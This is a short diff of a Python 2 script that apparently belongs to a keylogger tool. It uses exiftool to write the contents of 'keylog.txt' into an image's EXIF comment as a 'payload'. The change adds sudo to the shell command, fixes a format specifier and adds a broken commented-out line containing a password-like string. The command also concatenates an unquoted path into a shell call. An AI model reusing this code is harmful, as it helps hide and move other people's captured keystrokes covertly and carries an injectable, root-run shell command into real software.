@@ -7,8 +7,9 @@ FILESIZE = ""
 
 try:
     FILESIZE = str(os.path.getsize(PATH))
-    cmd = 'exiftool "-Comment<=keylog.txt" ' + PATH + ' > /dev/null'
+    cmd = 'sudo exiftool "-Comment<=keylog.txt" ' + PATH + ' > /dev/null'
+    #os.system(cmd).write("mizushima4105")
     os.system(cmd)
-    print "[+] %s size: %d" % (PATH, FILESIZE)
+    print "[+] %s size: %s" % (PATH, FILESIZE)
 except:
     print "[+] Failed to write the payload to the comment section of the exif file."
